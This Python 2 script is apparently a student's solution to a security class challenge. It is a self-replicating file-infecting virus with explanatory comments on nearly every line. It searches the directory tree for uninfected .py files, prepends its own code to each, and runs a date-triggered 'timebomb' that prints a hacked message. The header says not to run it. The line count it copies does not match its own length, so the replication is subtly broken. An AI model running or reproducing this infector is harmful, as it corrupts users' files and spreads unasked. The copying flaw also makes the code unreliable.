#!/usr/bin/python

# Script: Ops 301 Class 14 Ops Challenge Solution
# Author: Ariel D.                  
# Date of latest revision: 16SEP2022      
# Purpose: Describe what this code does (DO NOT RUN IT)

# Import libraries os and datetime
import os
import datetime

# Variable SIGNATURE shows if file is infected
SIGNATURE = "VIRUS"

# Locates files to infect
def locate(path):
    # Empty array fo file names
    files_targeted = []
    # Gets list of files in path
    filelist = os.listdir(path)
    # Runs this loop for each entry in the new file list
    for fname in filelist:
        # If directory, run this command
        if os.path.isdir(path+"/"+fname):
            # runs location function on directory and adds more files to file list
            files_targeted.extend(locate(path+"/"+fname))
        # If python script, run this command
        elif fname[-3:] == ".py":
            # Set up infected variable to false
            infected = False
            # Looks at each line in the file
            for line in open(path+"/"+fname):
                # Checks for virus signature in the file
                if SIGNATURE in line:
                    # Set infected to true if signature is found
                    infected = True
                    break
            # If file is clean
            if infected == False:
                # Add file to targeted list
                files_targeted.append(path+"/"+fname)
    # Return the list of files that need infection
    return files_targeted

# Function to infect files found in locate function
def infect(files_targeted):
    # Open the contents of the current virus script
    virus = open(os.path.abspath(__file__))
    # Start the virus string variable as empty
    virusstring = ""
    # For each line in the virus file
    for i,line in enumerate(virus):
        # If the current line is greater or equal to 0 and less than 39
        if 0 <= i < 39:
            # Add the line to the virus string
            virusstring += line
    # Close the virus file
    virus.close
    # For each file in the files to infect array
    for fname in files_targeted:
        # Open the file
        f = open(fname)
        # Put the current file cotents into a temp variable
        temp = f.read()
        # Close file
        f.close()
        # Open file for writing
        f = open(fname,"w")
        # Replace the file with current virus file lines, append the previoud contents saved in temp
        f.write(virusstring + temp)
        # Close the file
        f.close()

# Timebomb print command
def detonate():
    # If the current month is May and day is 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Execute the print statement
        print "You have been hacked"

# Start with targeted files in current directory of the virus script
files_targeted = locate(os.path.abspath(""))

# Infect files found in above function
infect(files_targeted)

# Runs detonate
detonate()